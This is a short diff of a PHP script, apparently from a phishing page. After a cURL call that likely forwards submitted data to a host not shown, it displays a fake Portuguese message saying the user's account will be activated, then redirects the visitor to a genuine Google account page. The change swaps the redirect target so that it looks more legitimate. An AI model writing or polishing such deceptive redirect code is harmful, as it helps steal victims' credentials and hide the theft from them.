@@ -18,6 +18,6 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $exec = curl_exec($ch);
 curl_close($ch);
 
-echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');window.location.href='https://gmail.com'</script>";
+echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');window.location.href='https://myaccount.google.com/personal-info'</script>";
 
 ?>
